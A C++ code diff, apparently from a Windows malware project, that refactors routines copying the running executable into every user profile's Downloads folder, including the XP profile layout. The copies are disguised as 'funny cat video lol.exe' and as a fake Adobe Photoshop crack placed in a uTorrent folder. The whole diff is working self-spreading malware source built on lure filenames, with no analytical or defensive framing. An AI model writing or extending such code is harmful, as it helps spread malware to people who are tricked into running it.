@@ -12,15 +12,26 @@
 // into every profile's Downloads folder (including Public).
 // ============================================================
 
-static void DropCatVid()
+// Shared: copy the running exe (as `targetName`) into the
+// downloads folder of every user profile.
+//
+// Works on both layouts:
+//   NT6+ : C:\Users\<name>\Downloads\...
+//   XP   : C:\Documents and Settings\<name>\My Documents\...
+//
+// `extraSub` is an optional sub-path below the downloads dir.
+static void CopyToProfiles(
+    const wchar_t* targetName,
+    const wchar_t* extraSub
+)
 {
     wchar_t selfPath[MAX_PATH];
 
     if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH))
         return;
 
-    const wchar_t* targetName = L"funny cat video lol.exe"; //L"cat vid.exe";
-
+    // Enumerate profiles, preferring the NT6+ "Users" root and
+    // falling back to the XP "Documents and Settings" root.
     WIN32_FIND_DATAW fd{};
 
     HANDLE find =
@@ -30,6 +41,15 @@ static void DropCatVid()
         );
 
     if (find == INVALID_HANDLE_VALUE)
+    {
+        find =
+            FindFirstFileW(
+                L"C:\\Documents and Settings\\*",
+                &fd
+            );
+    }
+
+    if (find == INVALID_HANDLE_VALUE)
         return;
 
     do
@@ -37,38 +57,53 @@ static void DropCatVid()
         if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
             continue;
 
-        if (wcscmp(fd.cFileName, L".") == 0)
+        if (
+            wcscmp(fd.cFileName, L".") == 0 ||
+            wcscmp(fd.cFileName, L"..") == 0
+        )
             continue;
 
-        if (wcscmp(fd.cFileName, L"..") == 0)
-            continue;
-
-        wchar_t downloads[MAX_PATH];
-
-        // TODO: make this work on XP too
-        // XP uses C:\Documents and Settings\[Username]\My Documents\My Videos
-        // folder style.
-        // while 10 uses C:\Users\[Username]\Videos
-        // folder style
-        // TL;DR: make it work on both
+        wchar_t base[MAX_PATH];
 
         wsprintfW(
-            downloads,
+            base,
             L"C:\\Users\\%ls\\Downloads",
             fd.cFileName
         );
 
-        if (GetFileAttributesW(downloads) == INVALID_FILE_ATTRIBUTES)
-            continue;
+        if (GetFileAttributesW(base) == INVALID_FILE_ATTRIBUTES)
+        {
+            wsprintfW(
+                base,
+                L"C:\\Documents and Settings\\%ls\\My Documents",
+                fd.cFileName
+            );
+
+            if (GetFileAttributesW(base) == INVALID_FILE_ATTRIBUTES)
+                continue;
+        }
 
         wchar_t dest[MAX_PATH];
 
-        wsprintfW(
-            dest,
-            L"%ls\\%ls",
-            downloads,
-            targetName
-        );
+        if (extraSub && extraSub[0])
+        {
+            wsprintfW(
+                dest,
+                L"%ls\\%ls\\%ls",
+                base,
+                extraSub,
+                targetName
+            );
+        }
+        else
+        {
+            wsprintfW(
+                dest,
+                L"%ls\\%ls",
+                base,
+                targetName
+            );
+        }
 
         CopyFileW(selfPath, dest, FALSE);
     }
@@ -77,72 +112,22 @@ static void DropCatVid()
     FindClose(find);
 }
 
+static void DropCatVid()
+{
+    CopyToProfiles(
+        L"funny cat video lol.exe", //L"cat vid.exe",
+        NULL
+    );
+}
+
 static void Cracklol01()
 {
-    wchar_t selfPath[MAX_PATH];
-
-    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH))
-        return;
-
-    // TODO: add a system where every version of windows have a diff
-    // name, like XP have "Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE"
-    // but windows 10 could have an updated adobe crack version
-    // eg. "Adobe.Photoshop.CC.2019.v20.0.0.Multilingual.Crack.[TechTools].exe"
-    const wchar_t* targetName = L"Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE.7z.rar09.exe"; //L"cat vid.exe";
-
-    WIN32_FIND_DATAW fd{};
-
-    HANDLE find =
-        FindFirstFileW(
-            L"C:\\Users\\*",
-            &fd
-        );
-
-    if (find == INVALID_HANDLE_VALUE)
-        return;
-
-    do
-    {
-        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
-            continue;
-
-        if (wcscmp(fd.cFileName, L".") == 0)
-            continue;
-
-        if (wcscmp(fd.cFileName, L"..") == 0)
-            continue;
-
-        wchar_t downloads[MAX_PATH];
-
-        // TODO: make this work on XP too
-        // XP uses C:\Documents and Settings\[Username]\My Documents\My Videos
-        // folder style.
-        // while 10 uses C:\Users\[Username]\Videos
-        // folder style
-        // TL;DR: make it work on both
-
-        wsprintfW(
-            downloads,
-            L"C:\\Users\\%ls\\Downloads\\uTorrent\\Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE\\Setup+Crack",
-            fd.cFileName
-        );
-
-        if (GetFileAttributesW(downloads) == INVALID_FILE_ATTRIBUTES)
-            continue;
-
-        wchar_t dest[MAX_PATH];
-
-        wsprintfW(
-            dest,
-            L"%ls\\%ls",
-            downloads,
-            targetName
-        );
-
-        CopyFileW(selfPath, dest, FALSE);
-    } while (FindNextFileW(find, &fd));
-
-    FindClose(find);
+    // TODO: pick a per-OS crack filename (XP-era CS4 name vs a
+    // newer Adobe crack name on modern Windows).
+    CopyToProfiles(
+        L"Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE.7z.rar09.exe",
+        L"uTorrent\\Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE\\Setup+Crack"
+    );
 }
 
 // ============================================================
